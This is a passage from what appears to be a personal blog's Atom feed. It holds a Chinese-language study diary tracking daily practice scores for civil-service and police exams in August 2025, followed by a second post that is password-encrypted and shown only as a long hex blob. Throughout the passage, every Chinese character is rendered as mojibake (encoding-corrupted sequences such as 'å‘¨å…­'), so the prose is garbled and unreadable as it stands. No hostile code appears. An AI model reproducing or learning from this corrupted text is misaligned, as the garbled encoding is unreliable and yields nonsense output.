src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_2025-08-15_232824_777.png" style="zoom:25%;" /><h3 id="8-16-å‘¨å…­"><a href="#8-16-å‘¨å…­" class="headerlink" title="8.16 å‘¨å…­"></a>8.16 å‘¨å…­</h3><p>èººäº†ä¸€å¤©ï¼ŒçœŸèˆ’æœğŸ˜‹</p><h3 id="8-17-å‘¨æ—¥"><a href="#8-17-å‘¨æ—¥" class="headerlink" title="8.17 å‘¨æ—¥"></a>8.17 å‘¨æ—¥</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>ç¬¬ä¸‰æ¬¡æ¨¡è€ƒï¼Œç“¦è¾¾è¥¿ï¼Œé¼ é¼ ã®æ”¿æ²»ç†è®ºã€å¸¸è¯†ã€èµ„æ–™æ˜¯ä¸æ˜¯å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼ŒçœŸè‰äº†</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250818095904.png"></p><p>æ”¿æ²»ç†è®º&amp;å¸¸è¯†ï¼šnmè¿˜æ²¡å­¦ï¼Œå“ªå‡‰å¿«å“ªå‘†ç€å»</p><p>è¨€è¯­ï¼šé€æ¸æ­¥å…¥æ­£è½¨ï¼Œç»§ç»­ä¿æŒ</p><p>æ•°é‡ï¼šå¯æƒœï¼Œåšäº†8é“ï¼Œè’™äº†ä¸¤é“dï¼Œè¦æ˜¯è’™Cå°±å…¨å¯¹äº†</p><p>åˆ¤æ–­ï¼šå›¾æ¨è¿˜å¯ä»¥ç²¾è¿›ä¸€ä¸‹</p><p>èµ„æ–™ï¼šæˆ‘çœŸçš„è‰äº†ï¼Œçœ‹äº†ä¸€ä¸‹é”™çš„8é“é‡Œæœ‰6é“é¢˜ç›®çœ‹é”™äº†ï¼Œå°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›å°¼ç›</p><h3 id="8-18-8-24"><a href="#8-18-8-24" class="headerlink" title="8.18 - 8.24"></a>8.18 - 8.24</h3><p>è«åå¥‡å¦™ğŸäº†ï¼Œä¸‰å¤©é«˜çƒ§+ä¸¤å¤©ä½çƒ§+ä¸¤å¤©æ‘†å­ï¼Œå±å®æ˜¯ç»™æˆ‘æ‘†çˆ½äº†</p><p>å‘¨äº”æ™šä¸Šåšäº†ä¸ªè—è“ç½‘çš„è¡Œæµ‹æ¨¡è€ƒã€‚</p><p>ç¬¬ä¸€æ¬¡çœŸå®çš„è”è€ƒå¥—å·ï¼Œä¸¤ä¸ªæ„Ÿæ‚Ÿï¼šä¸€ï¼Œç›´è§‰å¾—ç»ƒï¼Œè¿™ä¸ªåˆ†å¿…é¡»æ‹¿ï¼›äºŒï¼Œæ•°é‡å’Œèµ„æ–™æ—¶é—´æ˜¯çœŸä¸å¤Ÿï¼Œè¦å®šæ—¶é—´åˆ·äº†</p><p>å–œæè—è“ç½‘é™¢æ ¡ç¬¬ä¸‰ï¼Œç”Ÿæºåœ°ç¬¬ä¸ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250824222446.png">å‘¨æ—¥åšäº†ç¬¬31å­£çš„æ¨¡è€ƒï¼Œåˆå¤§è´¥è€Œå½’äº†</p><p>æ”¿æ²»ç†è®ºï¼šä¸è¯´äº†ï¼Œæˆ‘çš„è§‰æ‚Ÿï¼Œå“</p><p>å¸¸è¯†ï¼šè¿™æ¬¡æ³•å¾‹å¸¸è¯†é”™å°‘äº†ï¼Œç”Ÿæ´»æ–‡å­¦å¸¸è¯†å…¨æŒ‚ï¼Œè‰äº†</p><p>è¨€è¯­ï¼šé€‰è¯é”™å¤ªå¤šï¼Œæœç„¶é•¿æ—¶é—´ä¸åšé¢˜ï¼Œè¯­æ„Ÿéƒ½æ²¡äº†</p><p>æ•°é‡ï¼šèµ„æ–™æ—¶é—´èŠ±çš„å¤ªé•¿ï¼Œæ²¡æ—¶é—´åšäº†</p><p>åˆ¤æ–­ï¼šè¿™æ¬¡å›¾æ¨é”™äº†4ä¸ªï¼Œåˆ«çš„å®šä¹‰æ¨æ–­å…¨æ˜¯é•¿éš¾å¥ï¼Œä¹ŸèŠ±äº†å¥½é•¿æ—¶é—´</p><p>èµ„æ–™ï¼šæ­£ç¡®ç‡è¿˜è¡Œï¼Œä½†èŠ±çš„æ—¶é—´å®åœ¨æ˜¯å¤ªå¤šäº†</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250824222658.png"></p><h3 id="8-25-å‘¨ä¸€"><a href="#8-25-å‘¨ä¸€" class="headerlink" title="8.25 å‘¨ä¸€"></a>8.25 å‘¨ä¸€</h3><p><strong>è¡Œæµ‹</strong>ï¼š</p><p>ç›´è§‰ï¼š53&#x2F;60 ï¼Œå¾—åˆ† 7.92&#x2F;10ï¼Œåšé”™å€’æ‰£æ˜¯çœŸçš„çƒ¦ï¼Œè¿˜å¾—ç»ƒã€‚å¯»æ‰¾è¯è¯­å…ƒç´ çš„é‚£ä¸ªè¿˜æ˜¯åšçš„å¤ªæ…¢äº†</p><p>åˆ¤æ–­æ¨ç†ï¼šå›¾æ¨ä¸€ 10&#x2F;10 8åˆ†35ç§’ï¼Œå›¾æ¨äºŒ 8&#x2F;10 11åˆ†49ç§’ï¼›ä»Šå¤©é¢˜è¿˜ç®—ç®€å•</p><p>èµ„æ–™ï¼š16&#x2F;20 26åˆ†é’Ÿï¼Œä¸€é¢˜èŒƒå›´çœ‹é”™ï¼Œä¸€é¢˜å¹´ä»½çœ‹é”™ï¼ŒçœŸçš„æ˜¯ç›²äººè€ƒå…¬ï¼Œç„¶åæœ‰ä¸ªç®—å¢é•¿é‡ï¼Œå› ä¸ºRå°äº5%ï¼Œæˆ‘ç›´æ¥ä¹˜äº†ï¼Œæ²¡æƒ³åˆ°ç»™çš„é€‰é¡¹è¯¯å·®å¤ªå°ï¼Œï¼Œç›´æ¥é”™ä¸¤é¢˜ã€‚ã€‚ã€‚</p><p>è¨€è¯­ï¼šç‰‡æ®µé˜…è¯»15&#x2F;20 18åˆ†é’Ÿï¼›å¥½å‡ ä¸ªé”™é€‰éƒ½çŠ¯äº†æ— ä¸­ç”Ÿæœ‰çš„æ¯›ç—…ã€‚ã€‚ã€‚</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>åˆ‘æ³•</p><p><strong>ç”³è®ºï¼š</strong></p><p>25å›½è€ƒç”³è®ºçœŸé¢˜å‰¯çœçº§1ã€2ã€3é¢˜ï¼Œä»€ä¹ˆsbé¢˜ç›®ï¼Œä¸€ç‚¹ä¸ä¼šå†™</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250825233608_26_294.png" style="zoom:25%;" /><h3 id="8-26-å‘¨äºŒ"><a href="#8-26-å‘¨äºŒ" class="headerlink" title="8.26 å‘¨äºŒ"></a>8.26 å‘¨äºŒ</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>åšäº†å­¦æ ¡ä¸­å…¬çš„æ¨¡è€ƒï¼Œå¥¶å¥¶çš„ï¼Œæ€ä¹ˆæ¨¡è€ƒèµ„æ–™é¢˜ç›®åŠ è½½ä¸å‡ºæ¥ï¼Œè¿˜è«åé—ªé€€ï¼Œåšäº†è¿˜ä¸çŸ¥é“æˆç»©ï¼Œè¯´æ˜¯è¦åèƒ½æ‰èƒ½æœºæ”¹ï¼Œé¢ã€‚</p><p>ç›´è§‰ï¼š56&#x2F;60 é”™3 æ²¡åš1ï¼Œä¸€ç‚¹ç‚¹æå‡ï¼</p><p>å›¾æ¨ï¼š9&#x2F;10 é”™äº†ä¸€ä¸ªå¾ˆé€†å¤©çš„é¢˜</p><p><strong>ç”³è®ºï¼š</strong></p><p>25å›½è€ƒç”³è®ºçœŸé¢˜å‰¯çœçº§4ã€5é¢˜ï¼Œå¤§ä½œæ–‡æ¢è®¨ä¸»è§‚èƒ½åŠ¨æ€§å¯¹äºçŸ›ç›¾è½¬åŒ–çš„ä½œç”¨ï¼Œè¿˜ç®—å¥½å†™ğŸ¤”</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢çš„å½•æ’­å¬äº†ä¸¤èŠ‚ï¼Œç®—æ˜¯æŠŠåˆ‘æ³•åˆ†åˆ™ç»™æå®Œäº†</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250826230218_27_294.jpg" style="zoom:25%;" /><h3 id="8-27-å‘¨ä¸‰"><a href="#8-27-å‘¨ä¸‰" class="headerlink" title="8.27 å‘¨ä¸‰"></a>8.27 å‘¨ä¸‰</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>ç›´è§‰ï¼š52&#x2F;60 é”™8é“ï¼Œnmbï¼Œè¿™ä¸ªé€‰å‡ºç°å‡ ä¸ªè¯è¯­çš„æ˜¯çœŸçš„å¸é©¬äº†</p><p>èµ„æ–™ï¼š18&#x2F;20 30åˆ†é’Ÿï¼›é€Ÿåº¦éœ€è¦æä¸Šå»ï¼</p><p>æ•°é‡ï¼š 9&#x2F;10 14åˆ†53ç§’ï¼Œæ„Ÿè§‰æ˜¯ç²‰ç¬”çš„é¢˜å¾ˆç®€å•çš„ç¼˜æ•…ğŸ¤”</p><p>è¨€è¯­ï¼šç‰‡æ®µé˜…è¯» 12&#x2F;20ï¼ŒçœŸå¸é©¬äº†ï¼Œç‰¢è®°æœ‰å¯¹ç­–é€‰å¯¹ç­–ï¼Œtmd</p><p>å›¾æ¨ï¼šç»ƒä¹ ä¸€ 7&#x2F;10ï¼›ç»ƒä¹ äºŒ 6&#x2F;10ï¼›ä»Šå¤©å›¾æ¨ä¹Ÿè·Ÿsmäº†ä¸€æ ·ã€‚ä¸€é“é»‘å—åˆ†å¼€çœ‹å¯¹ç§°ï¼Œä¸€é“ä¹å®«æ ¼ç±³å­—å‹æ„å›¾ï¼Œå‡ºé¢˜æ€è·¯æ¥æºæ˜¯æ²³å›¾æ´›ä¹¦ï¼Œæé©¬é©¬æ»´ã€‚</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250827152853.png" style="zoom:25%;" /><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250827152931.png" style="zoom:25%;" /><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢ã€Šäººæ°‘è­¦å¯Ÿä½¿ç”¨è­¦æ¢°å’Œæ­¦å™¨æ¡ä¾‹ã€‹+ã€Šè¡Œæ”¿æ³•ä¸è¡Œæ”¿è¯‰è®¼æ³•ã€‹</p><p><strong>ç”³è®ºï¼š</strong></p><p>å°é©¬å“¥æ¦‚æ‹¬å½’çº³ç†è®ºå®Œç»“ï¼Œæ”¶è·å¾ˆå¤š</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250827234730_37_294.jpg" style="zoom:25%;" /><h3 id="8-28-å‘¨å››"><a href="#8-28-å‘¨å››" class="headerlink" title="8.28 å‘¨å››"></a>8.28 å‘¨å››</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>åˆ¤æ–­æ¨ç†ï¼šå›¾æ¨ä¸€ 8&#x2F;10 10åˆ†50ç§’ï¼›å›¾æ¨äºŒ 8&#x2F;10 12åˆ†23ç§’ï¼›è¿˜è¡Œ</p><p>ç›´è§‰ï¼š54&#x2F;60 é”™5é“ï¼Œæ²¡åš1é“</p><p>æ•°é‡ï¼š8&#x2F;10 17åˆ†8ç§’ï¼›è‰ï¼Œé”™çš„ä¸¤é“éƒ½æ˜¯å¿˜ç®—æœ€åä¸€æ­¥äº†ï¼Œå¦ˆå¦ˆç”Ÿçš„</p><p>è¨€è¯­ï¼š17&#x2F;20ï¼›ä»Šå¤©çŠ¶æ€è¿˜ä¸é”™</p><p>èµ„æ–™ï¼š18&#x2F;20 24åˆ†34ç§’ï¼›è¿˜è¡Œä»Šå¤©ï¼Œæœ‰é“é¢˜å¯ä»¥ä½¿ç”¨ä¹˜ç§¯å¢é•¿ç‡çš„é‚ªä¿®æ–¹æ³•ï¼Œæ¶¨å§¿åŠ¿äº†</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ°‘æ³•å…¸+æ°‘æ³•</p><p><strong>ç”³è®ºï¼š</strong></p><p>å°é©¬å“¥ç»¼åˆåˆ†æ1+2</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250828234240_38_294.jpg" style="zoom:25%;" /><h3 id="8-29-å‘¨äº”"><a href="#8-29-å‘¨äº”" class="headerlink" title="8.29 å‘¨äº”"></a>8.29 å‘¨äº”</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>ç›´è§‰ï¼š57&#x2F;60 ï¼Œé”™3é“ï¼Œè¿˜è¡Œ</p><p>åˆ¤æ–­æ¨ç†ï¼šå›¾æ¨ç»ƒä¹ ä¸€ï¼Œ8&#x2F;10 8åˆ†37ç§’ï¼›å›¾æ¨ç»ƒä¹ äºŒï¼Œ7&#x2F;10ï¼Œ13åˆ†42ç§’ï¼›å¯¹äºç›´è§’è¿™ç±»å…³ç³»è¿˜ä¸æ˜¯å¾ˆæ•æ„Ÿ</p><p>æ•°é‡ï¼š9&#x2F;10 20åˆ†é’Ÿï¼›æœ€åç•™äº†é“æ’åˆ—ç»„åˆèŠ±äº†5åˆ†é’Ÿè¿˜åšé”™äº†ã€‚ã€‚ç­”æ¡ˆè¿˜tmæ˜¯Cï¼Œè¦æ˜¯è€ƒè¯•æˆ‘ç»å£è’™å¯¹äº†ğŸ‘Š</p><p>èµ„æ–™ï¼š17&#x2F;20 23åˆ†40ç§’ï¼›æ—¥äº†ç‹—äº†ï¼Œä¸€é“é¢˜å¹²é‡Œæ•°æ®æ‰¾é”™äº†ï¼Œä¸€é“çœ¼çï¼Œä¸€é“è‰ç¨¿çº¸ä¸Š24%æŠ„æˆ34%äº†ã€‚</p><p>è¨€è¯­ï¼šç‰‡æ®µé˜…è¯»15&#x2F;20ï¼Œæœ‰ç‚¹ç‹—å±</p><p><strong>ç”³è®ºï¼š</strong></p><p>é‡å†™25å›½è€ƒç”³è®ºçœŸé¢˜å‰¯çœçº§ç¬¬2é¢˜</p><p>å°é©¬å“¥ç”³è®ºç»¼åˆåˆ†æå®Œç»“</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢æ–°ç‰ˆç›‘å¯Ÿæ³•+æ‰§æ³•è§„èŒƒåŠè­¦æƒ…å¤„ç½®ï¼ˆä¸€ï¼‰ï¼ˆäºŒï¼‰</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250829233724_49_294.png" style="zoom:25%;" /><h3 id="8-30-å‘¨å…­"><a href="#8-30-å‘¨å…­" class="headerlink" title="8.30 å‘¨å…­"></a>8.30 å‘¨å…­</h3><p>ä¼‘æ¯æ—¥ï¼é¸£æ½®2.6çœŸå¥½ç©ğŸ˜‹ï¼Œå°¤è¯ºçœŸå¥½çœ‹å‘œå‘œå‘œ</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831225343.png" style="zoom:50%;" /><h3 id="8-31-å‘¨æ—¥"><a href="#8-31-å‘¨æ—¥" class="headerlink" title="8.31 å‘¨æ—¥"></a>8.31 å‘¨æ—¥</h3><p><strong>è¡Œæµ‹ï¼š</strong></p><p>åˆæ¥åˆ°äº†æ¯å‘¨çš„ç²‰ç¬”æ¨¡è€ƒæ—¶é—´ï¼æé©¬é©¬æ»´ä¸€çœ‹åˆ†æ•°è¿˜æŒºå¼€å¿ƒï¼Œä¸€çœ‹æ’åä»€ä¹ˆå±Œç©æ„ï¼Œæ¯”ä¸Šæ¬¡è¿˜é€€æ­¥äº†è‰</p><p>psï¼šè°¢è€å¸ˆæ™šä¸Šç•¥å¾®å‡ºæ‰‹80åˆ†ï¼ŒæŠŠæˆ‘å½“ğŸ“é²¨</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250831220328.png"></p><p>æ”¿æ²»ç†è®ºï¼šæé©¬æ»´ï¼Œå¯ä»¥æŠŠæˆ‘æ¯™äº†</p><p>å¸¸è¯†ï¼šä½ åˆ«è¯´å…¬ä¸“å­¦èµ·æ¥è¡Œæ”¿æ‰§æ³•çš„å‰å‡ é“æ³•å¾‹å¸¸è¯†èƒ½å¯¹å‡ é“ï¼Œç¬¬ä¸€æ¬¡æ­£ç¡®ç‡è¿‡50ğŸ˜€</p><p>è¨€è¯­ï¼šè¿™æ¬¡è¨€è¯­å¾ˆç®€å•ï¼Œbutæˆ‘é€‰è¯åªæœ‰10&#x2F;15ï¼Œbyd5ä¸ªäºŒé€‰ä¸€å…¨é”™ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ğŸ¤”</p><p>æ•°é‡ï¼šå¾ˆå¥‡æ€ªï¼Œæ¨¡è€ƒä¸€é‡åˆ°å’Œå·®å€æ¯”ã€æ’åˆ—ç»„åˆè„‘å­å°±ä¸€å›¢æµ†ç³Šï¼Œè‰äº†</p><p>åˆ¤æ–­ï¼šå›¾æ¨8&#x2F;10ï¼Œè¿˜èƒ½æ¥å—ï¼Œmdæœ‰ä¸ªç‚¹é”™æ­£ç¡®ç­”æ¡ˆäº†ï¼›é€»è¾‘åˆ¤æ–­è¿é”™3ä¸ªï¼Œæµ‹äº†æˆ‘éƒ½ä¸çŸ¥é“æ€ä¹ˆå›äº‹</p><p>èµ„æ–™ï¼šé¢æœ¬æ¥èƒ½å…¨é˜Ÿçš„ï¼Œæ’åºé¢˜é¡ºåºæ’åäº†ï¼›ç¬¬ä¸€å¥—é¢˜ç¬¬äºŒå¼ è¡¨çœ‹éƒ½æ²¡çœ‹åˆ°ï¼Œæ€ªä¸å¾—æœ‰ä¸€é“é¢˜æ²¡æ‰¾åˆ°æ•°æ®ğŸ¤¡ğŸ‘Š</p><p>æ€ä¹ˆåŠå•Šï¼ŒçœŸçš„æ·¦äº†</p><p><strong>å…¬ä¸“ï¼š</strong></p><p>æ³¢æ³¢çš„æ²»å®‰ç®¡ç†å¤„ç½šæ³• The latest version!</p><p>æéº»éº»æ»´ï¼Œæ€ä¹ˆè¦é‡æ–°èƒŒï¼Œæ—©ä¸æ”¹æ™šä¸æ”¹ï¼Œååé¼ é¼ è€ƒè¯•è¿™å¹´æ”¹</p><p>ğŸ‘ŠğŸ‘ŠğŸ‘Š</p><p><strong>ç”³è®ºï¼š</strong></p><p>25å¹´çš„å‰¯çœå·1-4é¢˜å¤ç›˜ï¼Œå¤§ä½œæ–‡ç•™æ˜å¤©</p><p>æ‰¹å‡ºæ¥çš„åˆ†æ•°æˆ‘è‡ªå·±éƒ½æƒ³ç¬‘</p><p>ä»”ç»†çœ‹äº†çœ‹å‘ç°å¥½å‡ é¢˜ç†è§£æ–¹é¢éƒ½æœ‰ç‚¹é—®é¢˜</p><p>æ¯”å¦‚ä¸‰æ¡é»„æ²³ï¼ŒååŒæ²»ç†ï¼Œæˆ‘ç†è§£æˆä¸€å®šè¦ä½“ç°åŸå‹ã€æ•°å­—ã€æ¨¡å‹ä¸‰ä¸ªåŠ åœ¨ä¸€èµ·æ‰ç®—ã€‚ã€‚ã€‚</p><p>è¿˜æœ‰ä»Šå·ç²®ä»“çš„å®£ä¼ ç¨¿ï¼Œæˆ‘é‡ç‚¹å…¨åœ¨â€œå‰ä¸–ä»Šç”Ÿâ€å¦‚ä½•æ”¹é€ äº†ï¼Œæ²¡æ„è¯†åˆ°å±•æ¿ç¨¿å­çš„ç‰¹æ€§</p><p>å“ï¼Œæå—æ»´é‚£å¸®æ’è¡Œæ¦œä¸Š70+çš„äººæ€ä¹ˆå†™å‡ºæ¥çš„</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250831224118_50_294.png" style="zoom:25%;" /><h1 id="å°è®°"><a href="#å°è®°" class="headerlink" title="å°è®°"></a>å°è®°</h1><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250831224416_51_294.jpg" style="zoom:25%;" /><p>å“ï¼Œé¥æƒ³ä¸Šæ¬¡è¿™ä¹ˆå­¦è¿˜æ˜¯åœ¨é«˜ä¸­</p><p>è¿™ä¸‰å¹´çœŸçš„å¥½ä¹…æ²¡åä¸‹æ¥è®¤çœŸåŠ¨ç¬”çœ‹ä¹¦äº†</p><p>8æœˆå°±è¿™ä¹ˆè¿‡å»äº†ï¼Œnmdæ—¶é—´çœŸçš„è¿‡çš„å¥½å¿«å•Š</p><p><strong>9æœˆç›®æ ‡</strong></p><ul><li>äº‰å–è¡Œæµ‹æ¨¡è€ƒç¨³75å†²80ï¼Œæ˜¯æ—¶å€™å¼€æ”¿æ²»ç†è®º+å¸¸è¯†äº†</li><li>å…¬ä¸“çŸ¥è¯†ç‚¹è¿˜å·®ä¸€ç‚¹ï¼Œè¿‡å®Œåå¯ä»¥å¼€åˆ·æ³¢æ³¢çš„æ¨¡æ‹Ÿé¢˜äº†</li><li>ç”³è®ºï¼Œå“ï¼Œå¥½å¥½å†™å§ğŸ˜­</li></ul>]]></content>
    
    
    <categories>
      
      <category>shellä¹‹å¤–</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¢ç¢å¿µ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>koreyã®å†²åˆºæ—¥è®°</title>
    <link href="/2025/06/03/korey%E3%81%AE%E5%86%B2%E5%88%BA%E6%97%A5%E8%AE%B0/"/>
    <url>/2025/06/03/korey%E3%81%AE%E5%86%B2%E5%88%BA%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="161c8df2997d2cadf584dd58abd1356ece257b516dab89ab4dc841d8f0ad685e">89f8473ef2dc783f8ebd2d425d47342eede6f4a09d4f4728d006db532058608083c954daff7f06efe918c9151eac322ccfbd26282ab1ee8e2739fc38f7112e6c71086598f469eea9a43cb7ff937f42ba1de8b90854fc66f773e40b0173446316d547f7eaa935dab899239d841e45db8ca6571033e73598bb3fd93db208d19f58b096946234bd3412a5018e0c118b59fc7852509d88a1e2e90d80a08742f67a19bcc811ec89691a310d6eeb1e8bb431781b01b99963e808cf53fdbc290dd684faa3d211a0a638e562199e0b90b56142b19b32eae79c3bf04ce41b37322a18f8c90008e70e40d5822728ef2faeeeee324722d8990a9cba717aadef2482ba4f64926ca0ebf424cec0927d321f6d6266fef286f255405f4221e0f8729876c058fb94bd5657554a4fa601d9db675ff1113291b258631d37d99604a79d881b0c6fec5fda05851bfc808f3323ff1f5dacf048c6c7598aa1f3926048754d85597445444193db9c15a3f2749097875ada568dbf418a5755a8dd3eae7089eae52a56cd60265ee7cdaf03d47c37a3a3fc048910ab7259b8336d1372723a4c8a9b45785e734747281de0ecea023b4d0f0625408a7dec635e40144b461f465860b6778971381134d0b2ba9c29daff4941c89a2843be9a48b0ec0d3105eb715160c9e65a3de7dd72d1585469eb0645d5946a1775386b8736a6955a2a34454a5d593ed1fab4c915f7e0b475892ca9c3e53d6963b8dfb232daf667d7e1c7ea8a73a9afb398f8ed30a1f0ca2999c3585b98a4b8ac8ed1bf6bcc71cf4e1ab7986349cd23d83a471e20046d0c57ad4ccfe4b5f0679d050f09ad046872b68fca857ec5fe689267a55af6480fbfcdf2a24aee027db7e162add33347360d11110464eed948b2ddc9fc462ebe527d0b3c714f5692ba7164cd524eb24642c10e7047c7b603a6b3b777d51822b6f19184038656b28c96b6a3abd09228d3ff7e3d4521fbedda901feed03e25872da4147ccfcb6a037c21f8c9109dee0846b083e7551a00188052cc9402b7165d4e264a2067096cd02f1d15d1a39d25f5ea1331292906bb11909f217216f4b3760ff4709784d837f26c4f5b1e6452363df5d77896e70bccc4f3319797536f4d6e2bf9855d85a07f9553af507da67ea3f0f2a9658268ab07eb0912b7999d34e477879b778e5853b0013cbfb5834e8ce689a7e744a2555e5d3957dcd5654d1a6e84e876934a61aeb5722d62a2619764b1c8aa2d2bf5ca422ea397e93a3be27e94a13c095369763a6ed3e76bac16fdd196741e00824cab5c13a72fa7ee8a2f24149e171ae9e3b1b0a2ff7f55f22628eb88718a8fcca184987206cb6b59347f04baeaa412f04c66aea4f17645cd5a82faea3f1904cf4af69e9dae4122d641a404abf9562536378f94fce1a3d0eb8fea6ae624d921ef917b3adf0388c009e07ef4f35136e83e8b705c26bd8316f77b5c12d79a90da6c45a8dccd1337c24a7fc42ba97b7f9677824df29e349678fc67d8c66426f9fee0c687b46480d435691c86e5b96bcb21d51e5df816f96337de391faf949c10ee8be91c44d5c11b870b86e956255411fe5a13f75c22300bf15fc949221608e8e65d269abd5b7bd42bb6176bf3f8661cd85f5ec5d0dcf0e96023a44f449caa61e447ad7936286a3f0a794ba6ca7eba5e97f48bcb238c6c2e1205bb7050f22152ca03d8c5ae34856174f4f22eea0eb78e54aff458c102998571b9a74233efe2c7a102b0c8a9a282639d4a42d195316f78ee9b60d785cebd539cc61f0dda73ae99e6585aeb58235ec1e307f6d89fb3905a198ac098d5dc20b65601599ddb49f5c6a0e943d35044bb4aaf3b490fc1f99fa9880f9db0bec46a4ba3e0d0ceec3cd29fb55f17303f8c2bff9b72efd04c583ce26dc9d4d2407e1384e40a867858280c95b5da25b79ffa9976c34dc21569483e84ef4f887d35610414901a817036bb95192bc8f372d862b08919337c8335d597839fb00b111dcce976db2d41310d8e314edbf50775739b0eb27f92f5560ca341839798caeb5c26a4121edf88d2afb03f64ec38a39c2ef473722e139db84746f5728419d5efe89ffbfb0eec1e532e1dfe8c63148d1fab8b63b7d7ea7ac6b40575a706fcfee2a9d639139eb1aa0e1280b867b5494acfd1ccaf2e9458f213b318a2c1408d6d42121c174de7710f2b47563c3f602e1e75fc57a01c2b9c07202e5bc6ad81108a4fc12efa9cd07140276c4e84409d811dbb84678c7cc7cb5794264eaa2faf48085dc11d60c3d3de6d0f56b4af0f39bc90cb8381a561ab11daf7ec380207c344f2c3221303bc3f71cee9d026c11a76b2f8f6c782a7189d6174c74ee8b138d2796d1856bba85cb064320fa0a8c5a5e0ff0f9913fd204d160bc83e98519f9585f743796ea23176d2216d4573f986c7e91d7992139f0aeee06d4500d08e68186fa241bfdc22e19f3be61070f7741056f6d569d06091b1cde841cb0edc91becf62e90edda7a5b33a17f77a5b09bedf8de912c9e710338ecf312a836ea15583d581c70dd3c64fb74de5a6adb243eccd6d9cd74ae8f98dd1cb1afade4262ddeb77b0cc09c349d072f1c0c579bab3dc07ca039918688aa861fa89bdb8bbbd1bf22ffc2de4fdb0cdb4374f40a31a3ea5d974d810c02ac6712280e2c579f1c129d5216dad69b98e55fb16edb01481fb2c82184ae26f2791dcddc4dd5d06c89859aaeaf41ef24ac52af3f93369e90459afea6451f7277545c3ee41f5bd79f522f3b7a209d76e5f82eec64205c28b253df8d053c36a85196ea8f290e9a3cc300f5a60e151161acde7469e9f2b0367fdda47a616326d6622fc04bb1afbc70c445f31b552432b0b338efa4db99fbbdbf6f8e55fe1feef85dbdba0a487f3d06c591227f16eeb8d0aeaec60c71926fc75fc475683c89337924d2e04fe3e6031056e8e7535c9b7d0751b608215da9735d37e6d3533513f462b3ccfad5643da150445649b62ecf3d959ea67bf500154c66ec1a4e0c0df5ec4b2f34b449600b3957c232a00253ca022426e2b3c88104d4ba516a324655d75092c1183f1bc85a7179903549c3fb88b53f4e5fc04d58042fd58df5c0483a3bc9aece4d9b574b1b2b64947f184ba604bb02a64911c7471008c385da0f60ffba2970dc6edfef5173f746b3f8ae220bc96854c41cfc13b4c0008da74ddcb40c29d18e551e2bf4bf8a9d1c8ec2347a7865807bfc1d6eebd8e3c6d5e1eae01bdc4156c4849949e81f500fd56df4fbbc9c8f970c8e3c8a7a3ff6db2717bc8eae2b098359e00547aec6b76fb22ede80ba37b49eda4469a9f44cb1ce72a6d653bcf012313959112b9554a587a6383d29515980c2fec4b7eb4a95af7fdfdb65e9f994d6f12d9e3471bece504747574d433d044d9e58c9574c9051d2eb458346f277d8d59acd3478626237259c132e9a4670e754598137e135ee56950906173b62c72c3c675ad95e07aa80d0a2c7e2ef975aa04f012e05f40f120f9da83a7fe7aefecd3160eda80bc6e2d56437c3a7245c82067634e5fe2fbd7c566413c313ee2d520eadf2404d0237e23f920e5adf6f98f2ae93293c5e36326bed3cd6a94e6d0ef423662705be74ff8a0ab4b9e89f53b729b28b7435eb55272e75db14aeefc34ddeb5a9b37250191917aa8866a780c013e3feb5b3c6e6529287695bdd90142ef6c38e95c738619e23f203e44210f855ba316d4c1d82a637180f4a031ed14737efc6c53eb176e1bd9a418829bcf3208f5d253b8f8ee4ac7f66713173461d1860b83ec19284881d6cfb8e4b105a2773c1ef1f3ab78eb1bb6f82d3d0d01d545c4889ed1285e28a4ac0cbafb2b4b126bf16f831b02ba448faa17ad66547372c7bd79ac7a41cbe5f29e83b68e8b0461306c6a9988f2e387466c444f9551510c03358d5c453ead885081c86030565bd54b099e0cedf638aeb3cd505d0d7